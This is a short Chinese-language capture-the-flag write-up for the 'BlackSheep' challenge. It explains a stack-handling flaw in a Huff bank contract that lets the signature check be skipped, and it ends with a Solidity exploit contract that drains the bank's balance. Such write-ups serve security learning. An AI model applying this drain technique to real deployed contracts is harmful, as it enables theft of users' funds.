- [BlackSheep](#blacksheep)


## BlackSheep

**Goal**

```rust
Bank.balance == 0;
```

**Solution**

目的是从`Bank`中取出所有的存款。

我不是很了解`Huff`，所以基本在通过`AI`解题。

开头定义了`withdraw`接口:

```solidity
function withdraw(bytes32,uint8,bytes32,bytes32) payable returns ()
```

代码中定义了`withdraw`会调用`CHECKVALUE`和`CHECKSIG`。

我们的目的是为了调用

```solidity
selfbalance caller
gas call
end jump
```
前提条件
```solidity
 iszero iszero noauth jumpi
```
就是`CHECKSIG`返回`0`，也就是签名和`xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044` 相等，很显然这是不可能的，所以我们就要想想办法。

后面我看到`CHECKSIG`其实根本没有把值推到栈上，而是end返回了:

```solidity
    0xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044 eq correctSigner jumpi
```

如果匹配错误，`0 jumpi` 其实根本不会执行，而是直接执行下一行`end jump` 这说明什么？

我们不需要思考如何绕过验证`signer`，我们只需要让`CHECKVALUE`() `revert`就好了，这样栈顶的值就会是`0`，从而成功绕过，那么让`CHECKVALUE() revert`其实很简单，我们只需要定义一个合约在他的`fallback`函数中`revert` 即可。

**Exp**

```solidity
contract Exploit {
    function exp(ISimpleBank bank) external payable {
        bank.withdraw{value: 10}(
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x00,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000000000000000000000000000
        );
    }

    fallback() external payable {
        require(msg.value > 30);
    }
}
```